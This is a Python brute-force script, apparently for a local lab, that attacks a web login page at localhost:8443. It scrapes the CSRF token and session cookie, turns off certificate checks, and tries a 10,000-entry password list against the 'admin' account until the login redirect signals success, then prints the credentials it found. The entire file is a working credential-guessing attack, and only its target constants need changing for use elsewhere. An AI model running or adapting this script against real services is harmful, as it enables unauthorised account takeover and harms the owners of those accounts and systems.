#!/usr/bin/python3
# -*- coding: utf-8 -*-

# To disable warnings in requests' vendored urllib3, import that specific instance of the module:
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
from modules.requests import Session, exceptions
from modules.bs4 import BeautifulSoup
from utils import utils as u
import time
import sys
import re
import os


PASSWORDS = os.path.join(os.path.dirname(__file__), 'utils/passwords10k.txt')
TARGET = 'https://localhost:8443/login'
SUCCESS = 'https://localhost:8443/'
SESSION_COOKIE = 'JSESSIONID'
CSRF_TOKEN = '_csrf'
USERNAME_FORM = 'username-form'
PASSWORD_FORM = 'password-form'


def main():
    print_banner()
    # Ignore unverified HTTPS request:
    disable_warnings(InsecureRequestWarning)
    t0 = time.time()
    result, attempts = brute_force()
    print_exit(result, attempts, t0)


def brute_force():
    attempts = 0
    username = "admin"
    passwords = list(read_passwords())
    print(u.info(), 'TOT # PASSWORDS:', len(passwords))
    session = build_session()

    try:
        for password in passwords:
            data = {USERNAME_FORM: username,
                    PASSWORD_FORM: password}
            attempt = request("POST", session, data)
            attempts += 1
            print_progress(attempts, username, password)

            if attempt.headers["Location"] == SUCCESS:
                print_success(username, password)
                return True, attempts

    except KeyboardInterrupt:
        print()
        pass

    return False, attempts


# -----------------------------------------------------------------
# HELPER FUNCTIONS
# -----------------------------------------------------------------
def read_passwords():
    try:
        with open(PASSWORDS, 'r') as passwords:
            return map(str.strip, passwords.readlines())

    except Exception as e:
        print(u.error(), 'COULD NOT READ:', PASSWORDS)
        quit()


def build_session():
    session = Session()
    session_cookie, csrf_token = get_session_tokens(session, True)

    headers = {'User-Agent':
               'Mozilla/5.0 (BF; Ubuntu; Linux x86_64; rv:76.0) '
               'Gecko/20100101 Firefox/76.0',
               'Accept': '*/*',
               'Connection': 'keep-alive',
               'Accept-Encoding': 'gzip, deflate',
               'Content-Length': '0'}
    session.headers.update(headers)

    cookies = {"name": SESSION_COOKIE,
               "value": session_cookie}
    session.cookies.set(**cookies)
    session.params = {CSRF_TOKEN: csrf_token}

    return session


def get_session_tokens(session, do_print=False):
    success = True
    response = request("GET", session)

    try:
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup('input', {'name': CSRF_TOKEN})[0]['value']

        session_cookie = re \
            .search(SESSION_COOKIE + '=(.*?);', response.headers['set-cookie']) \
            .group(1)

    except Exception as e:
        print(u.warn(), 'NO TOKENS(S) FOUND')
        return '', ''

    if success and do_print:
        print_tokens(csrf_token, session_cookie)

    return session_cookie, csrf_token


def request(req, session, payload=None):
    try:
        if 'GET' in req:
            return session.get(
                TARGET,
                verify=False,
                allow_redirects=False)

        elif 'POST' in req:
            return session.post(
                TARGET,
                data=payload,
                verify=False,
                allow_redirects=False)

    except exceptions.HTTPError as eh:
        print(u.error(), 'HTTPError:', eh)
        quit()

    except exceptions.ConnectionError as ec:
        print(u.error(), 'ConnectionError:', ec)
        quit()

    except exceptions.Timeout as et:
        print(u.warn(), 'Timeout:', et)

    except exceptions.RequestException as er:
        print(u.warn(), 'RequestException:', er)


# -----------------------------------------------------------------
# PRINT
# -----------------------------------------------------------------
def print_tokens(csrf, jsession_id):
    print(u.info(), "FOUND TOKENS")
    print(u.info(), "_csrf:", csrf)
    print(u.info(), "JSESSIONID:", jsession_id)


def print_success(username, password):
    print()
    print(u.info(), "FOUD CREDENTIALS")
    print(u.info(), "USERNAME:", username)
    print(u.info(), "PASSWORD:", password)


def print_progress(attempts, username, password):
    string = "{} #{}: {} + {}" \
        .format(u.debug(), attempts, username, password)
    print(f'{string}\r', end="")


def print_exit(success, attempts, t0):
    if not success:
        print(u.error(), "FAILED TO FIND CREDENTIALS")

    t = time.time() - t0
    hours, rem = divmod(t, 3600)
    minutes, seconds = divmod(rem, 60)
    print("%s TIME: %dh%dm%ds" % (u.info(), hours, minutes, seconds))
    print(u.info(), round(attempts / t, 2), "pw/s")


def print_banner():
    banner = r'''
  ____             _        __                    
 | __ ) _ __ _   _| |_ ___ / _| ___  _ __ ___ ___ 
 |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \
 | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/
 |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|
                                                  
    '''
    print(banner)


if __name__ == "__main__":
    main()
